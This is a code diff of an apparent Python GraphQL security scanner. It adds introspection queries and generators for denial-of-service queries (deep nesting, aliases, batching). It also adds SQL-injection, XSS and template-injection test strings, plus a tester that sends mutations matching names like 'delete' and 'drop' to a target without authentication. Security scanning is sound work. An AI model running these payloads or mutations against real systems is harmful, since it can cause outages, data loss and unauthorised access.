@@ -1,91 +1,54 @@
 from typing import Dict, List, Optional, Tuple, Set
 from dataclasses import dataclass, field
 from enum import Enum
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import re
-from collections import defaultdict
 import threading
 import time
 import json
 import hashlib
 
-
 class GraphQLVulnerabilityType(Enum):
     INTROSPECTION_ENABLED = "introspection_enabled"
-    EXCESSIVE_DATA_EXPOSURE = "excessive_data_exposure"
-    INSUFFICIENT_INPUT_VALIDATION = "insufficient_input_validation"
-    ALIAS_ATTACK = "alias_attack"
-    DEPTH_LIMIT_BYPASS = "depth_limit_bypass"
-    BATCH_ATTACK = "batch_attack"
-    BROKEN_AUTHENTICATION = "broken_authentication"
-    BROKEN_AUTHORIZATION = "broken_authorization"
-    SENSITIVE_DATA_IN_LOGS = "sensitive_data_in_logs"
-    GRAPHQL_INJECTION = "graphql_injection"
-    CIRCULAR_QUERY = "circular_query"
+    QUERY_DEPTH_ATTACK = "query_depth_attack"
+    QUERY_COMPLEXITY_ATTACK = "query_complexity_attack"
+    BATCH_QUERY_ATTACK = "batch_query_attack"
     FIELD_DUPLICATION = "field_duplication"
-    DOS_VULNERABILITY = "dos_vulnerability"
-
+    CIRCULAR_QUERY = "circular_query"
+    INFORMATION_DISCLOSURE = "information_disclosure"
+    INJECTION_VIA_GRAPHQL = "injection_via_graphql"
+    AUTHORIZATION_BYPASS = "authorization_bypass"
+    DOS_VIA_QUERY = "dos_via_query"
+    ALIAS_ABUSE = "alias_abuse"
+    DIRECTIVE_OVERLOAD = "directive_overload"
+    MUTATION_CSRF = "mutation_csrf"
 
 class QueryType(Enum):
     QUERY = "query"
     MUTATION = "mutation"
     SUBSCRIPTION = "subscription"
-    FRAGMENT = "fragment"
-    UNKNOWN = "unknown"
-
-
-class ScalarType(Enum):
-    STRING = "String"
-    INT = "Int"
-    FLOAT = "Float"
-    BOOLEAN = "Boolean"
-    ID = "ID"
-    CUSTOM = "Custom"
-
-
-@dataclass
-class GraphQLField:
-    name: str
-    field_type: str
-    is_required: bool = False
-    is_list: bool = False
-    arguments: List[Dict] = field(default_factory=list)
-    return_type: Optional[str] = None
-    description: Optional[str] = None
-    is_deprecated: bool = False
-    deprecation_reason: Optional[str] = None
-    is_sensitive: bool = False
-    has_side_effects: bool = False
-
-
-@dataclass
-class GraphQLType:
-    name: str
-    kind: str
-    fields: List[GraphQLField] = field(default_factory=list)
-    interfaces: List[str] = field(default_factory=list)
-    possible_types: List[str] = field(default_factory=list)
-    enum_values: List[str] = field(default_factory=list)
-    description: Optional[str] = None
-    is_input_type: bool = False
-    is_union_type: bool = False
-
+    INTROSPECTION = "introspection"
 
 @dataclass
 class GraphQLEndpoint:
     url: str
-    method: str
+    method: str = "POST"
+    headers: Dict[str, str] = field(default_factory=dict)
     introspection_enabled: bool = False
+    schema_extracted: bool = False
     authentication_required: bool = False
-    types_discovered: Dict[str, GraphQLType] = field(default_factory=dict)
-    operations: List[str] = field(default_factory=list)
-    mutations: List[str] = field(default_factory=list)
-    subscriptions: List[str] = field(default_factory=list)
-    queries: List[str] = field(default_factory=list)
-    discovered_at: float = field(default_factory=time.time)
-    schema_hash: Optional[str] = None
-    depth_limit: Optional[int] = None
-    complexity_limit: Optional[int] = None
+    rate_limited: bool = False
 
+@dataclass
+class GraphQLSchema:
+    types: List[Dict] = field(default_factory=list)
+    queries: List[Dict] = field(default_factory=list)
+    mutations: List[Dict] = field(default_factory=list)
+    subscriptions: List[Dict] = field(default_factory=list)
+    directives: List[Dict] = field(default_factory=list)
+    interfaces: List[Dict] = field(default_factory=list)
+    enums: List[Dict] = field(default_factory=list)
+    scalars: List[Dict] = field(default_factory=list)
 
 @dataclass
 class GraphQLVulnerability:
@@ -94,142 +57,119 @@ class GraphQLVulnerability:
     url: str
     severity: str
     evidence: str
-    affected_fields: List[str] = field(default_factory=list)
-    affected_types: List[str] = field(default_factory=list)
-    query_used: Optional[str] = None
-    response_data: Optional[str] = None
-    complexity_score: float = 0.0
-    depth_score: int = 0
-    width_score: int = 0
+    query_used: str
+    response_status: int
+    response_size: int
+    response_time: float
+    schema_info: Optional[Dict] = None
+    sensitive_fields: List[str] = field(default_factory=list)
+    exploitable_mutations: List[str] = field(default_factory=list)
     confirmed: bool = False
     confidence_score: float = 0.8
     remediation: str = ""
     timestamp: float = field(default_factory=time.time)
 
-
-class GraphQLEndpointDiscovery:
-    GRAPHQL_ENDPOINTS = [
-        '/graphql', '/api/graphql', '/gql', '/api/gql', '/query',
-        '/graphql/', '/v1/graphql', '/v2/graphql', '/v3/graphql',
-        '/.graphql', '/graphiql', '/apollo', '/relay',
-        '/graphql/v1', '/graphql/v2', '/api/v1/graphql',
-        '/api/v2/graphql', '/graphql/console', '/graphql-explorer',
-        '/playground', '/graphql/playground', '/altair',
-    ]
-    
-    GRAPHQL_INDICATORS = [
-        rb'"__schema"', rb'"__type"', rb'"queryType"',
-        rb'"mutationType"', rb'"subscriptionType"',
-        rb'GraphQL', rb'graphql',
-    ]
-    
-    @staticmethod
-    def discover_graphql_endpoints(base_url: str) -> List[GraphQLEndpoint]:
-        endpoints = []
-        
-        for endpoint_path in GraphQLEndpointDiscovery.GRAPHQL_ENDPOINTS:
-            url = base_url.rstrip('/') + endpoint_path
-            endpoint = GraphQLEndpoint(
-                url=url,
-                method='POST'
-            )
-            endpoints.append(endpoint)
-        
-        return endpoints
-    
-    @staticmethod
-    def detect_graphql_response(response_content: str) -> bool:
-        try:
-            response_bytes = response_content.encode('utf-8')
-            return any(indicator in response_bytes for indicator in GraphQLEndpointDiscovery.GRAPHQL_INDICATORS)
-        except:
-            return False
-
-
-class IntrospectionQueryBuilder:
-    FULL_INTROSPECTION_QUERY = '''
+class MegaIntrospectionQuery:
+    FULL_INTROSPECTION = '''
     query IntrospectionQuery {
         __schema {
+            queryType { name }
+            mutationType { name }
+            subscriptionType { name }
             types {
-                name
-                kind
-                description
-                fields(includeDeprecated: true) {
-                    name
-                    description
-                    isDeprecated
-                    deprecationReason
-                    type {
-                        name
-                        kind
-                        ofType {
-                            name
-                            kind
-                            ofType {
-                                name
-                                kind
-                            }
-                        }
-                    }
-                    args {
-                        name
-                        description
-                        type {
-                            name
-                            kind
-                            ofType {
-                                name
-                                kind
-                            }
-                        }
-                        defaultValue
-                    }
-                }
-                enumValues(includeDeprecated: true) {
-                    name
-                    description
-                    isDeprecated
-                    deprecationReason
-                }
-                interfaces {
-                    name
-                    kind
-                }
-                possibleTypes {
-                    name
-                    kind
-                }
-                inputFields {
-                    name
-                    type {
-                        name
-                        kind
-                    }
-                }
-            }
-            queryType {
-                name
-                fields {
-                    name
-                }
-            }
-            mutationType {
-                name
-                fields {
-                    name
-                }
-            }
-            subscriptionType {
-                name
-                fields {
-                    name
-                }
+                ...FullType
             }
             directives {
                 name
                 description
                 locations
                 args {
+                    ...InputValue
+                }
+            }
+        }
+    }
+    
+    fragment FullType on __Type {
+        kind
+        name
+        description
+        fields(includeDeprecated: true) {
+            name
+            description
+            args {
+                ...InputValue
+            }
+            type {
+                ...TypeRef
+            }
+            isDeprecated
+            deprecationReason
+        }
+        inputFields {
+            ...InputValue
+        }
+        interfaces {
+            ...TypeRef
+        }
+        enumValues(includeDeprecated: true) {
+            name
+            description
+            isDeprecated
+            deprecationReason
+        }
+        possibleTypes {
+            ...TypeRef
+        }
+    }
+    
+    fragment InputValue on __InputValue {
+        name
+        description
+        type { ...TypeRef }
+        defaultValue
+    }
+    
+    fragment TypeRef on __Type {
+        kind
+        name
+        ofType {
+            kind
+            name
+            ofType {
+                kind
+                name
+                ofType {
+                    kind
+                    name
+                    ofType {
+                        kind
+                        name
+                        ofType {
+                            kind
+                            name
+                            ofType {
+                                kind
+                                name
+                                ofType {
+                                    kind
+                                    name
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    '''
+    
+    SIMPLE_INTROSPECTION = '''
+    {
+        __schema {
+            types {
+                name
+                fields {
                     name
                     type {
                         name
@@ -240,686 +180,484 @@ class IntrospectionQueryBuilder:
     }
     '''
     
-    MINIMAL_INTROSPECTION = '''
+    QUERY_TYPE_INTROSPECTION = '''
     {
         __schema {
-            queryType { name }
-            mutationType { name }
-            types { name kind }
+            queryType {
+                name
+                fields {
+                    name
+                    description
+                    args {
+                        name
+                        type {
+                            name
+                        }
+                    }
+                }
+            }
+        }
+    }
+    '''
+    
+    MUTATION_TYPE_INTROSPECTION = '''
+    {
+        __schema {
+            mutationType {
+                name
+                fields {
+                    name
+                    description
+                    args {
+                        name
+                        type {
+                            name
+                        }
+                    }
+                }
+            }
         }
     }
     '''
     
     @staticmethod
-    def build_introspection_query() -> str:
-        return IntrospectionQueryBuilder.FULL_INTROSPECTION_QUERY.strip()
-    
-    @staticmethod
-    def build_minimal_introspection() -> str:
-        return IntrospectionQueryBuilder.MINIMAL_INTROSPECTION.strip()
-    
-    @staticmethod
-    def build_field_discovery_query(type_name: str) -> str:
-        return f'''
-        query {{
-            __type(name: "{type_name}") {{
-                name
-                kind
-                fields {{
-                    name
-                    description
-                    type {{
-                        name
-                        kind
-                    }}
-                    args {{
-                        name
-                        type {{
-                            name
-                            kind
-                        }}
-                    }}
-                }}
-            }}
-        }}
-        '''
-    
-    @staticmethod
-    def build_enum_discovery_query(type_name: str) -> str:
-        return f'''
-        query {{
-            __type(name: "{type_name}") {{
-                name
-                kind
-                enumValues {{
-                    name
-                    description
-                }}
-            }}
-        }}
-        '''
-
-
-class GraphQLPayloadGenerator:
-    @staticmethod
-    def generate_alias_attack_payload(query: str, iterations: int = 100) -> str:
-        aliases = []
-        for i in range(iterations):
-            aliases.append(f"alias{i}: {query}")
-        
-        return "query AliasAttack { " + " ".join(aliases) + " }"
-    
-    @staticmethod
-    def generate_deep_nested_query(depth: int = 100) -> str:
-        query = "user { "
-        for i in range(depth):
-            query += f"profile{i} {{ "
-        query += "id name"
-        query += " }" * (depth + 1)
-        return f"query DeepNested {{ {query} }}"
-    
-    @staticmethod
-    def generate_batch_query(query: str, batch_size: int = 100) -> List[Dict]:
-        return [{"query": query, "operationName": f"Op{i}"} for i in range(batch_size)]
-    
-    @staticmethod
-    def generate_injection_payload(field: str) -> List[str]:
-        injection_variants = [
-            f'query {{ {field} {{ __typename }} }}',
-            f'query {{ {field} {{ __schema {{ types {{ name }} }} }} }}',
-            f'{{ {field}; __typename }}',
-            f'{{ {field} \\n __typename }}',
-            f'query {{ {field}(id: "1\' OR \'1\'=\'1") {{ id }} }}',
-            f'query {{ {field}(id: "1\\"; DROP TABLE users--") {{ id }} }}',
+    def get_all_queries() -> List[str]:
+        return [
+            MegaIntrospectionQuery.FULL_INTROSPECTION,
+            MegaIntrospectionQuery.SIMPLE_INTROSPECTION,
+            MegaIntrospectionQuery.QUERY_TYPE_INTROSPECTION,
+            MegaIntrospectionQuery.MUTATION_TYPE_INTROSPECTION,
         ]
-        return injection_variants
-    
-    @staticmethod
-    def generate_circular_query(field: str, depth: int = 50) -> str:
-        query = field + " { "
-        for _ in range(depth):
-            query += field + " { "
-        query += "id"
-        query += " }" * (depth + 1)
-        return f"query Circular {{ {query} }}"
-    
-    @staticmethod
-    def generate_field_duplication_payload(field: str, count: int = 100) -> str:
-        fields = " ".join([field] * count)
-        return f"query FieldDupe {{ user {{ {fields} }} }}"
 
-
-class IntrospectionAnalyzer:
-    _sensitive_patterns = frozenset([
-        'password', 'passwd', 'pwd', 'token', 'secret', 'key', 'credential',
-        'ssn', 'social', 'credit', 'card', 'cvv', 'email', 'phone', 'mobile',
-        'address', 'account', 'user', 'profile', 'private', 'confidential',
-        'auth', 'session', 'cookie', 'api_key', 'apikey', 'access_token',
-    ])
+class MegaAttackPayloadGenerator:
+    @staticmethod
+    def generate_depth_attack(depth: int = 15) -> str:
+        query = "query DepthAttack {\n"
+        for i in range(depth):
+            query += "  " * i + "user {\n"
+        query += "  " * depth + "id\n"
+        for i in range(depth - 1, -1, -1):
+            query += "  " * i + "}\n"
+        return query
     
     @staticmethod
-    def parse_introspection_response(response_content: str) -> Tuple[bool, Dict]:
+    def generate_complexity_attack() -> str:
+        return '''
+        query ComplexityAttack {
+            users {
+                id name email
+                posts { id title content author { id name } }
+                comments { id text post { id title } }
+                followers { id name email }
+                following { id name email }
+            }
+        }
+        '''
+    
+    @staticmethod
+    def generate_batch_attack(count: int = 10) -> List[Dict]:
+        batch = []
+        for i in range(count):
+            batch.append({
+                "query": f"query Query{i} {{ users {{ id name email }} }}"
+            })
+        return batch
+    
+    @staticmethod
+    def generate_alias_attack(alias_count: int = 50) -> str:
+        query = "query AliasAttack {\n"
+        for i in range(alias_count):
+            query += f"  user{i}: user(id: {i}) {{ id name email }}\n"
+        query += "}"
+        return query
+    
+    @staticmethod
+    def generate_circular_query() -> str:
+        return '''
+        query CircularQuery {
+            user(id: 1) {
+                friends {
+                    friends {
+                        friends {
+                            friends {
+                                friends {
+                                    friends {
+                                        id name
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        '''
+    
+    @staticmethod
+    def generate_field_duplication() -> str:
+        return '''
+        query FieldDuplication {
+            user(id: 1) {
+                id id id id id
+                name name name name name
+                email email email email email
+            }
+        }
+        '''
+    
+    @staticmethod
+    def generate_directive_overload() -> str:
+        return '''
+        query DirectiveOverload {
+            user(id: 1) @skip(if: false) @include(if: true) @deprecated(reason: "test") {
+                id @skip(if: false) @include(if: true)
+                name @skip(if: false) @include(if: true)
+                email @skip(if: false) @include(if: true)
+            }
+        }
+        '''
+    
+    @staticmethod
+    def generate_injection_payloads() -> List[str]:
+        return [
+            'query { user(id: "1 OR 1=1") { id name } }',
+            'query { user(id: "1\' OR \'1\'=\'1") { id name } }',
+            'query { user(id: "1; DROP TABLE users--") { id name } }',
+            'query { user(name: "<script>alert(1)</script>") { id name } }',
+            'query { user(name: "{{7*7}}") { id name } }',
+        ]
+
+class MegaSchemaAnalyzer:
+    SENSITIVE_FIELDS = [
+        'password', 'secret', 'token', 'api_key', 'apikey', 'private_key',
+        'credit_card', 'ssn', 'social_security', 'auth', 'credential',
+        'admin', 'root', 'superuser', 'internal'
+    ]
+    
+    DANGEROUS_MUTATIONS = [
+        'delete', 'remove', 'destroy', 'drop', 'truncate', 'exec',
+        'execute', 'run', 'eval', 'admin', 'update', 'modify'
+    ]
+    
+    @staticmethod
+    def analyze_schema(schema_data: Dict) -> GraphQLSchema:
+        schema = GraphQLSchema()
+        
         try:
-            data = json.loads(response_content)
+            schema_types = schema_data.get('data', {}).get('__schema', {})
             
-            if 'data' in data and '__schema' in data['data']:
-                schema = data['data']['__schema']
-                return True, schema
+            schema.types = schema_types.get('types', [])
             
-            if 'data' in data and '__type' in data['data']:
-                return True, {'types': [data['data']['__type']]}
+            query_type = schema_types.get('queryType', {})
+            if query_type:
+                schema.queries = query_type.get('fields', [])
             
-            return False, {}
-        except json.JSONDecodeError:
-            return False, {}
-    
-    @staticmethod
-    def extract_types_from_schema(schema: Dict) -> Dict[str, GraphQLType]:
-        types = {}
-        
-        if 'types' not in schema:
-            return types
-        
-        for type_info in schema['types']:
-            if not type_info or 'name' not in type_info:
-                continue
+            mutation_type = schema_types.get('mutationType', {})
+            if mutation_type:
+                schema.mutations = mutation_type.get('fields', [])
             
-            gql_type = GraphQLType(
-                name=type_info.get('name', ''),
-                kind=type_info.get('kind', ''),
-                description=type_info.get('description'),
-                is_input_type=type_info.get('kind') == 'INPUT_OBJECT',
-                is_union_type=type_info.get('kind') == 'UNION',
-            )
+            subscription_type = schema_types.get('subscriptionType', {})
+            if subscription_type:
+                schema.subscriptions = subscription_type.get('fields', [])
             
-            if 'fields' in type_info and type_info['fields']:
-                for field_info in type_info['fields']:
-                    field = GraphQLField(
-                        name=field_info.get('name', ''),
-                        field_type=IntrospectionAnalyzer._extract_type(field_info.get('type', {})),
-                        arguments=field_info.get('args', []),
-                        is_deprecated=field_info.get('isDeprecated', False),
-                        deprecation_reason=field_info.get('deprecationReason'),
-                        description=field_info.get('description'),
-                        is_sensitive=IntrospectionAnalyzer._is_sensitive_field(field_info.get('name', '')),
-                    )
-                    gql_type.fields.append(field)
-            
-            if 'enumValues' in type_info and type_info['enumValues']:
-                gql_type.enum_values = [e.get('name', '') for e in type_info['enumValues']]
-            
-            if 'interfaces' in type_info and type_info['interfaces']:
-                gql_type.interfaces = [i.get('name', '') for i in type_info['interfaces']]
-            
-            if 'possibleTypes' in type_info and type_info['possibleTypes']:
-                gql_type.possible_types = [p.get('name', '') for p in type_info['possibleTypes']]
-            
-            types[type_info.get('name', '')] = gql_type
-        
-        return types
-    
-    @staticmethod
-    def _extract_type(type_obj: Dict) -> str:
-        if not type_obj:
-            return 'Unknown'
-        
-        if 'ofType' in type_obj and type_obj['ofType']:
-            inner_type = IntrospectionAnalyzer._extract_type(type_obj['ofType'])
-            kind = type_obj.get('kind', '')
-            
-            if kind == 'LIST':
-                return f"[{inner_type}]"
-            elif kind == 'NON_NULL':
-                return f"{inner_type}!"
-            
-            return inner_type
-        
-        return type_obj.get('name', 'Unknown')
-    
-    @staticmethod
-    def _is_sensitive_field(field_name: str) -> bool:
-        field_lower = field_name.lower()
-        return any(pattern in field_lower for pattern in IntrospectionAnalyzer._sensitive_patterns)
-    
-    @staticmethod
-    def find_sensitive_fields(types: Dict[str, GraphQLType]) -> List[Tuple[str, str, str]]:
-        sensitive_fields = []
-        
-        for type_name, gql_type in types.items():
-            for field in gql_type.fields:
-                if field.is_sensitive:
-                    sensitive_fields.append((type_name, field.name, field.field_type))
-        
-        return sensitive_fields
-    
-    @staticmethod
-    def extract_mutations(schema: Dict) -> List[str]:
-        mutations = []
-        
-        if 'mutationType' in schema and schema['mutationType']:
-            mutation_type_name = schema['mutationType'].get('name')
-            
-            for type_info in schema.get('types', []):
-                if type_info.get('name') == mutation_type_name:
-                    for field in type_info.get('fields', []):
-                        mutations.append(field.get('name', ''))
-        
-        return mutations
-    
-    @staticmethod
-    def extract_queries(schema: Dict) -> List[str]:
-        queries = []
-        
-        if 'queryType' in schema and schema['queryType']:
-            query_type_name = schema['queryType'].get('name')
-            
-            for type_info in schema.get('types', []):
-                if type_info.get('name') == query_type_name:
-                    for field in type_info.get('fields', []):
-                        queries.append(field.get('name', ''))
-        
-        return queries
-    
-    @staticmethod
-    def extract_subscriptions(schema: Dict) -> List[str]:
-        subscriptions = []
-        
-        if 'subscriptionType' in schema and schema['subscriptionType']:
-            subscription_type_name = schema['subscriptionType'].get('name')
-            
-            for type_info in schema.get('types', []):
-                if type_info.get('name') == subscription_type_name:
-                    for field in type_info.get('fields', []):
-                        subscriptions.append(field.get('name', ''))
-        
-        return subscriptions
-    
-    @staticmethod
-    def calculate_schema_hash(schema: Dict) -> str:
-        schema_str = json.dumps(schema, sort_keys=True)
-        return hashlib.sha256(schema_str.encode()).hexdigest()
-
-
-class QueryComplexityAnalyzer:
-    @staticmethod
-    def analyze_query_depth(query: str) -> int:
-        max_depth = 0
-        current_depth = 0
-        
-        for char in query:
-            if char == '{':
-                current_depth += 1
-                max_depth = max(max_depth, current_depth)
-            elif char == '}':
-                current_depth -= 1
-        
-        return max_depth
-    
-    @staticmethod
-    def analyze_query_width(query: str) -> int:
-        fields = re.findall(r'\b([a-zA-Z_][a-zA-Z0-9_]*)\s*[:{(]', query)
-        return len(set(fields))
-    
-    @staticmethod
-    def estimate_query_complexity(query: str, depth_weight: float = 2.0, width_weight: float = 1.5) -> float:
-        depth = QueryComplexityAnalyzer.analyze_query_depth(query)
-        width = QueryComplexityAnalyzer.analyze_query_width(query)
-        
-        complexity = (depth * depth_weight) + (width * width_weight)
-        return complexity
-    
-    @staticmethod
-    def detect_alias_attack(query: str) -> Tuple[bool, int]:
-        alias_pattern = re.compile(r'\b([a-zA-Z0-9_]+)\s*:\s*([a-zA-Z0-9_]+)')
-        aliases = alias_pattern.findall(query)
-        
-        if len(aliases) > 10:
-            return True, len(aliases)
-        
-        return False, len(aliases)
-    
-    @staticmethod
-    def detect_circular_references(query: str) -> Tuple[bool, List[str]]:
-        field_pattern = re.compile(r'\b([a-zA-Z_][a-zA-Z0-9_]*)\s*\{')
-        fields = field_pattern.findall(query)
-        
-        field_count = {}
-        for field in fields:
-            field_count[field] = field_count.get(field, 0) + 1
-        
-        circular = [f for f, count in field_count.items() if count > 3]
-        
-        return len(circular) > 0, circular
-    
-    @staticmethod
-    def detect_field_duplication(query: str) -> Tuple[bool, Dict[str, int]]:
-        field_pattern = re.compile(r'\b([a-zA-Z_][a-zA-Z0-9_]*)\s*(?:\(|{|\s|$)')
-        fields = field_pattern.findall(query)
-        
-        field_count = {}
-        for field in fields:
-            field_count[field] = field_count.get(field, 0) + 1
-        
-        duplicates = {f: count for f, count in field_count.items() if count > 5}
-        
-        return len(duplicates) > 0, duplicates
-    
-    @staticmethod
-    def calculate_estimated_response_size(query: str, avg_field_size: int = 100) -> int:
-        depth = QueryComplexityAnalyzer.analyze_query_depth(query)
-        width = QueryComplexityAnalyzer.analyze_query_width(query)
-        
-        estimated_size = (width ** depth) * avg_field_size
-        return min(estimated_size, 1000000000)
-
-
-class ErrorAnalyzer:
-    _disclosure_patterns = frozenset([
-        'line', 'column', 'positions', 'locations',
-        'path', 'extensions', 'exception',
-        'stacktrace', 'traceback', 'stack trace',
-        'sql', 'database', 'query', 'syntax',
-        'file', 'directory', 'path', 'error',
-        'internal', 'debug', 'trace',
-    ])
-    
-    @staticmethod
-    def parse_graphql_errors(response_content: str) -> List[Dict]:
-        try:
-            data = json.loads(response_content)
-            if 'errors' in data:
-                return data['errors']
-        except json.JSONDecodeError:
+            schema.directives = schema_types.get('directives', [])
+        except:
             pass
         
-        return []
+        return schema
     
     @staticmethod
-    def detect_information_disclosure(errors: List[Dict]) -> Tuple[bool, List[str]]:
-        disclosures = []
+    def find_sensitive_fields(schema: GraphQLSchema) -> List[str]:
+        sensitive = []
         
-        for error in errors:
-            error_str = json.dumps(error).lower()
-            
-            for pattern in ErrorAnalyzer._disclosure_patterns:
-                if pattern in error_str:
-                    disclosures.append(f"Error exposes: {pattern}")
+        for type_def in schema.types:
+            fields = type_def.get('fields', [])
+            for field in fields:
+                field_name = field.get('name', '').lower()
+                if any(s in field_name for s in MegaSchemaAnalyzer.SENSITIVE_FIELDS):
+                    sensitive.append(f"{type_def.get('name', 'Unknown')}.{field.get('name')}")
         
-        return len(disclosures) > 0, list(set(disclosures))
+        for query in schema.queries:
+            query_name = query.get('name', '').lower()
+            if any(s in query_name for s in MegaSchemaAnalyzer.SENSITIVE_FIELDS):
+                sensitive.append(f"Query.{query.get('name')}")
+        
+        return sensitive
     
     @staticmethod
-    def extract_error_messages(errors: List[Dict]) -> List[str]:
-        messages = []
+    def find_dangerous_mutations(schema: GraphQLSchema) -> List[str]:
+        dangerous = []
         
-        for error in errors:
-            if 'message' in error:
-                messages.append(error['message'])
+        for mutation in schema.mutations:
+            mutation_name = mutation.get('name', '').lower()
+            if any(d in mutation_name for d in MegaSchemaAnalyzer.DANGEROUS_MUTATIONS):
+                dangerous.append(mutation.get('name'))
         
-        return messages
+        return dangerous
     
     @staticmethod
-    def detect_sql_errors(errors: List[Dict]) -> bool:
-        sql_keywords = ['sql', 'database', 'syntax', 'mysql', 'postgres', 'oracle', 'sqlite']
-        
-        for error in errors:
-            error_str = json.dumps(error).lower()
-            if any(keyword in error_str for keyword in sql_keywords):
-                return True
-        
-        return False
+    def calculate_complexity(schema: GraphQLSchema) -> int:
+        complexity = 0
+        complexity += len(schema.types) * 1
+        complexity += len(schema.queries) * 2
+        complexity += len(schema.mutations) * 3
+        complexity += len(schema.subscriptions) * 2
+        return complexity
 
+class MegaAuthBypassTester:
+    @staticmethod
+    def test_unauthenticated_introspection(session, url: str, timeout: int) -> Tuple[bool, str]:
+        headers = {'Content-Type': 'application/json'}
+        
+        query = {"query": MegaIntrospectionQuery.SIMPLE_INTROSPECTION}
+        
+        try:
+            response = session.post(url, json=query, headers=headers, timeout=timeout, verify=False)
+            
+            if response.status_code == 200:
+                data = response.json()
+                if '__schema' in str(data):
+                    return True, 'Introspection accessible without auth'
+        except:
+            pass
+        
+        return False, 'Auth required or introspection disabled'
+    
+    @staticmethod
+    def test_mutation_without_auth(session, url: str, mutations: List[str], timeout: int) -> List[str]:
+        vulnerable = []
+        
+        for mutation in mutations[:5]:
+            query = {"query": f"mutation {{ {mutation} }}"}
+            
+            try:
+                response = session.post(url, json=query, timeout=timeout, verify=False)
+                
+                if response.status_code == 200 and 'error' not in response.text.lower():
+                    vulnerable.append(mutation)
+            except:
+                pass
+        
+        return vulnerable
 
 class GraphQLScanner:
-    _remediation_cache = (
-        "Disable GraphQL introspection in production environment. "
-        "Implement query complexity analysis and limits. "
-        "Set maximum query depth limits (recommended: 10-15). "
-        "Implement rate limiting and throttling. "
-        "Validate and sanitize all inputs. "
-        "Implement proper authentication and authorization. "
-        "Use operation allow-lists (persisted queries). "
-        "Implement request batching limits. "
-        "Remove sensitive data from error messages. "
-        "Monitor GraphQL queries for suspicious patterns. "
-        "Implement query cost analysis. "
-        "Use DataLoader to prevent N+1 queries. "
-        "Implement timeout mechanisms. "
-        "Disable field suggestions in production. "
-        "Use schema validation."
-    )
-    
-    def __init__(self):
-        self.endpoint_discovery = GraphQLEndpointDiscovery()
-        self.introspection_analyzer = IntrospectionAnalyzer()
-        self.payload_generator = GraphQLPayloadGenerator()
-        self.query_analyzer = QueryComplexityAnalyzer()
-        self.error_analyzer = ErrorAnalyzer()
-        self.introspection_builder = IntrospectionQueryBuilder()
+    def __init__(self, max_workers: int = 15):
+        self.introspection_queries = MegaIntrospectionQuery()
+        self.payload_generator = MegaAttackPayloadGenerator()
+        self.schema_analyzer = MegaSchemaAnalyzer()
+        self.auth_tester = MegaAuthBypassTester()
         
-        self.discovered_endpoints: Dict[str, GraphQLEndpoint] = {}
-        self.vulnerabilities: List[GraphQLVulnerability] = []
-        self.scan_statistics = defaultdict(int)
-        self.tested_queries: Set[str] = set()
+        self.vulnerabilities = []
+        self.extracted_schema = None
         self.lock = threading.Lock()
+        self.max_workers = max_workers
     
-    def scan(self, target_url: str, response: Dict) -> List[GraphQLVulnerability]:
-        vulnerabilities = []
-        response_content = response.get('content', '')
-        status_code = response.get('status_code', 0)
+    def scan(self, target_url: str, response: Dict, session=None) -> List[GraphQLVulnerability]:
+        vulns = []
         
-        if not self.endpoint_discovery.detect_graphql_response(response_content):
-            return vulnerabilities
+        introspection_enabled, schema_data = self._test_introspection(target_url, response, session)
         
-        endpoints = self.endpoint_discovery.discover_graphql_endpoints(target_url)
-        
-        for endpoint in endpoints:
-            introspection_query = self.introspection_builder.build_introspection_query()
+        if introspection_enabled:
+            vuln = GraphQLVulnerability(
+                vulnerability_type='GraphQL Vulnerability',
+                graphql_type=GraphQLVulnerabilityType.INTROSPECTION_ENABLED,
+                url=target_url,
+                severity='High',
+                evidence='Introspection query successful',
+                query_used=MegaIntrospectionQuery.SIMPLE_INTROSPECTION,
+                response_status=response.get('status_code', 0),
+                response_size=len(response.get('content', '')),
+                response_time=response.get('response_time', 0),
+                schema_info=schema_data,
+                confirmed=True,
+                confidence_score=0.95,
+                remediation=self._get_remediation()
+            )
+            vulns.append(vuln)
             
-            is_graphql, schema = self.introspection_analyzer.parse_introspection_response(response_content)
-            
-            if is_graphql and schema:
-                endpoint.introspection_enabled = True
-                endpoint.schema_hash = self.introspection_analyzer.calculate_schema_hash(schema)
+            if schema_data:
+                schema = self.schema_analyzer.analyze_schema(schema_data)
+                self.extracted_schema = schema
                 
-                types = self.introspection_analyzer.extract_types_from_schema(schema)
-                endpoint.types_discovered = types
-                
-                queries = self.introspection_analyzer.extract_queries(schema)
-                endpoint.queries = queries
-                
-                mutations = self.introspection_analyzer.extract_mutations(schema)
-                endpoint.mutations = mutations
-                
-                subscriptions = self.introspection_analyzer.extract_subscriptions(schema)
-                endpoint.subscriptions = subscriptions
-                
-                sensitive_fields = self.introspection_analyzer.find_sensitive_fields(types)
-                
-                if sensitive_fields:
+                sensitive = self.schema_analyzer.find_sensitive_fields(schema)
+                if sensitive:
                     vuln = GraphQLVulnerability(
                         vulnerability_type='GraphQL Vulnerability',
-                        graphql_type=GraphQLVulnerabilityType.INTROSPECTION_ENABLED,
-                        url=endpoint.url,
+                        graphql_type=GraphQLVulnerabilityType.INFORMATION_DISCLOSURE,
+                        url=target_url,
                         severity='High',
-                        evidence=f'Introspection enabled: {len(types)} types, {len(sensitive_fields)} sensitive fields | Schema hash: {endpoint.schema_hash[:16]}',
-                        affected_fields=[f[1] for f in sensitive_fields],
-                        affected_types=[f[0] for f in sensitive_fields],
-                        response_data=json.dumps(sensitive_fields[:10]),
+                        evidence=f'Sensitive fields exposed: {", ".join(sensitive[:10])}',
+                        query_used='Schema Analysis',
+                        response_status=200,
+                        response_size=0,
+                        response_time=0,
+                        sensitive_fields=sensitive,
                         confirmed=True,
-                        confidence_score=0.95,
-                        remediation=self._remediation_cache
+                        confidence_score=0.92,
+                        remediation=self._get_remediation()
                     )
-                    vulnerabilities.append(vuln)
-                    self.scan_statistics['introspection_enabled'] += 1
+                    vulns.append(vuln)
                 
-                if mutations:
-                    vuln = GraphQLVulnerability(
-                        vulnerability_type='GraphQL Vulnerability',
-                        graphql_type=GraphQLVulnerabilityType.EXCESSIVE_DATA_EXPOSURE,
-                        url=endpoint.url,
-                        severity='Medium',
-                        evidence=f'{len(mutations)} mutations exposed: {", ".join(mutations[:10])}',
-                        affected_fields=mutations,
-                        confirmed=True,
-                        confidence_score=0.85,
-                        remediation=self._remediation_cache
+                dangerous = self.schema_analyzer.find_dangerous_mutations(schema)
+                if dangerous and session:
+                    unauth_mutations = self.auth_tester.test_mutation_without_auth(
+                        session, target_url, dangerous, 10
                     )
